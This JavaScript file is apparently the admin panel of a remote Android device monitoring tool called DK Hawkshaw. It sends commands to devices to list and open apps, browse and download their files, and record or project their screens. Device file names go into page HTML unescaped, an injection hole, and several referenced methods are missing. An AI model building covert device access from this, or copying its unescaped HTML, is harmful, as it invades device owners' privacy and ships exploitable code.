// Enhanced Admin Panel JavaScript for DK Hawkshaw App
// Supports all command types and expanded functionality

// Socket.IO client is loaded via CDN in the HTML
const io = window.io;

class HawkshawAdmin {
    constructor() {
        this.socket = null;
        this.currentDevice = null;
        this.authToken = localStorage.getItem('hawkshaw_admin_token');
        this.devices = [];
        this.init();
    }

    async init() {
        try {
            this.initSocket();
            this.bindEvents();
            if (this.authToken) {
                this.showMainApp();
                try {
                    await this.loadDashboard();
                } catch (error) {
                    console.error('Failed to load dashboard:', error);
                    this.showAlert('Failed to load dashboard. Please refresh the page.', 'danger');
                }
            }
        } catch (error) {
            console.error('Initialization error:', error);
            this.showAlert('Failed to initialize the application. Please check the console for details.', 'danger');
        }
    }

    initSocket() {
        try {
            this.socket = io({
                reconnection: true,
                reconnectionAttempts: 5,
                reconnectionDelay: 1000
            });
            
            this.socket.on('connect', () => {
                console.log('Connected to server');
                if (this.authToken) {
                    this.socket.emit('join-admin');
                }
            });

            this.socket.on('connect_error', (error) => {
                console.error('Connection error:', error);
                this.showAlert('Connection error. Please check your network and refresh the page.', 'danger');
            });

            // Add other socket event handlers here
            
        } catch (error) {
            console.error('Socket initialization error:', error);
        }
    }

    bindEvents() {
        // Bind UI events here
        document.getElementById('loginForm')?.addEventListener('submit', (e) => {
            e.preventDefault();
            this.login();
        });
        
        // Add other event bindings as needed
    }

    async login() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        try {
            const response = await fetch('/api/admin/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            });
            
            const data = await response.json();
            if (data.success && data.token) {
                this.authToken = data.token;
                localStorage.setItem('hawkshaw_admin_token', this.authToken);
                this.showMainApp();
                await this.loadDashboard();
            } else {
                this.showAlert('Login failed. Please check your credentials.', 'danger');
            }
        } catch (error) {
            console.error('Login error:', error);
            this.showAlert('Login error. Please try again.', 'danger');
        }
    }

    showMainApp() {
        document.getElementById('loginContainer').classList.add('d-none');
        document.getElementById('mainApp').classList.remove('d-none');
    }

    async loadDashboard() {
        try {
            // Load dashboard data
            const response = await fetch('/api/admin/dashboard', {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
            });
            
            const data = await response.json();
            if (data.success) {
                // Update dashboard UI with data
                this.updateDashboardUI(data.data);
            }
        } catch (error) {
            console.error('Dashboard load error:', error);
            this.showAlert('Failed to load dashboard data.', 'danger');
        }
    }

    updateDashboardUI(data) {
        // Update the dashboard UI with the provided data
        // This is a placeholder - implement according to your UI structure
    }

    showAlert(message, type = 'info') {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
        alertDiv.role = 'alert';
        alertDiv.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        `;
        
        const container = document.getElementById('alertsContainer') || document.body;
        container.prepend(alertDiv);
        
        // Auto-remove after 5 seconds
        setTimeout(() => {
            alertDiv.remove();
        }, 5000);
    }

    showNotification(message, type = 'info') {
        // Similar to showAlert but can be customized for different styling
        this.showAlert(message, type);
    }

    // Add other methods here...
    async requestAppsList() {
        if (!this.currentDevice) return;
        await this.sendCommand('push_installed_app_list', {});
        this.showNotification('Apps list request sent', 'info');
    }

    async openApp(packageName) {
        if (!this.currentDevice) return;
        await this.sendCommand('open_app', { package_name: packageName });
        this.showNotification(`Open app command sent: ${packageName}`, 'success');
    }

    async loadFileExplorerSection() {
        if (!this.currentDevice) {
            this.showAlert('Please select a device first', 'warning');
            return;
        }

        const container = document.getElementById('fileExplorerContainer');
        if (!container) return;

        container.innerHTML = `
            <div class="card">
                <div class="card-header">
                    <h5>File Explorer</h5>
                    <div class="input-group mt-2">
                        <input type="text" class="form-control" id="fileExplorerPath" 
                               placeholder="/storage/emulated/0" value="/storage/emulated/0">
                        <button class="btn btn-primary" onclick="hawkshawAdmin.browseFiles()">
                            <i class="fas fa-folder-open"></i> Browse
                        </button>
                    </div>
                </div>
                <div class="card-body">
                    <div id="fileExplorerContent">
                        <p class="text-muted">Click Browse to explore device files</p>
                    </div>
                </div>
            </div>`;
    }

    async browseFiles() {
        const path = document.getElementById('fileExplorerPath').value;
        if (!this.currentDevice || !path) return;

        try {
            const response = await fetch(`/api/file-explorer/device/${this.currentDevice.id}?path=${encodeURIComponent(path)}`, {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
            });
            
            const data = await response.json();
            if (data.success) {
                this.renderFileExplorer(data.data.files);
            }
        } catch (error) {
            console.error('File explorer error:', error);
            this.showAlert('Failed to browse files. Please try again.', 'danger');
        }
    }

    renderFileExplorer(files) {
        const content = document.getElementById('fileExplorerContent');
        if (!content || !files) return;

        if (files.length === 0) {
            content.innerHTML = '<p class="text-muted">No files found in this directory.</p>';
            return;
        }

        const rows = files.map(file => `
            <tr>
                <td>
                    <i class="${file.isDirectory ? 'fas fa-folder' : 'fas fa-file'}"></i>
                    ${file.name}
                </td>
                <td>${file.isDirectory ? '-' : this.formatFileSize(file.size)}</td>
                <td>${new Date(file.modified).toLocaleString()}</td>
                <td>
                    ${file.isDirectory ? 
                        `<button class="btn btn-sm btn-primary" 
                                onclick="hawkshawAdmin.browseFiles('${file.path}')">
                            Open
                        </button>` : 
                        `<button class="btn btn-sm btn-success" 
                                onclick="hawkshawAdmin.downloadFile('${file.path}')">
                            <i class="fas fa-download"></i> Download
                        </button>`
                    }
                </td>
            </tr>
        `).join('');

        content.innerHTML = `
            <div class="table-responsive">
                <table class="table table-hover">
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${rows}
                    </tbody>
                </table>
            </div>`;
    }

    formatFileSize(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    async downloadFile(path) {
        if (!this.currentDevice || !path) return;
        
        try {
            const response = await fetch(`/api/file-explorer/download?path=${encodeURIComponent(path)}`, {
                headers: {
                    'Authorization': `Bearer ${this.authToken}`
                }
            });
            
            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = path.split('/').pop();
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                a.remove();
            } else {
                throw new Error('Download failed');
            }
        } catch (error) {
            console.error('Download error:', error);
            this.showAlert('Failed to download file. Please try again.', 'danger');
        }
    }

    // Add other methods as needed...
}

// Global functions for HTML onclick handlers
window.startScreenRecording = function() {
    if (window.hawkshawAdmin) {
        window.hawkshawAdmin.startScreenRecording();
    }
};

window.stopScreenRecording = function() {
    if (window.hawkshawAdmin) {
        window.hawkshawAdmin.stopScreenRecording();
    }
};

window.startScreenProjection = function() {
    if (window.hawkshawAdmin) {
        window.hawkshawAdmin.startScreenProjection();
    }
};

window.stopScreenProjection = function() {
    if (window.hawkshawAdmin) {
        const sessionId = prompt('Enter session ID to stop:');
        if (sessionId) {
            window.hawkshawAdmin.stopProjection(sessionId);
        }
    }
};

// Helper function to escape HTML
function escapeHtml(unsafe) {
    if (unsafe === null || unsafe === undefined) return '';
    return String(unsafe)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// Initialize admin panel when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    try {
        // Initialize the admin panel
        window.hawkshawAdmin = new HawkshawAdmin();
        
        // Global function for section navigation
        window.showSection = function(sectionId) {
            if (!sectionId) return;
            
            // Hide all sections
            document.querySelectorAll('.content-section').forEach(section => {
                if (section instanceof HTMLElement) {
                    section.classList.add('d-none');
                }
            });
            
            // Show the selected section
            const targetSection = document.getElementById(`${sectionId}-section`);
            if (targetSection) {
                targetSection.classList.remove('d-none');
            }
            
            // Update active navigation
            document.querySelectorAll('.nav-link').forEach(link => {
                if (link instanceof HTMLElement) {
                    const linkSection = link.getAttribute('data-section');
                    link.classList.toggle('active', linkSection === sectionId);
                }
            });
        };
    } catch (error) {
        console.error('Failed to initialize admin panel:', error);
        const errorDiv = document.createElement('div');
        errorDiv.className = 'alert alert-danger';
        errorDiv.textContent = 'Failed to initialize the admin panel. Please check the console for details.';
        document.body.prepend(errorDiv);
    }
});

// Make escapeHtml available globally
window.escapeHtml = escapeHtml;
